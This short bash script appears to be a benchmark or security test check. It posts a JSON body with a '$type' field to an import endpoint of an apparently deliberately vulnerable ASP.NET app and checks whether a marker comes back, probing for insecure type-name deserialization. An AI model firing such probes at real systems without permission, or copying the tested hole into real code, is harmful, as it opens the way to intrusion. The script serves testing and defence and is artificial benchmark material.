#!/usr/bin/env bash
set -e; . "$(dirname "$0")/_lib.sh"
json='{"$type":"InsecureJsonPayload, BenchAspNet","Marker":"JSON-TYPENAME-PWN"}'
curl -s -X POST "$TARGET/api/import/json" -H 'content-type: application/json' -d "$json" | grep -q 'JSON-TYPENAME-PWN'
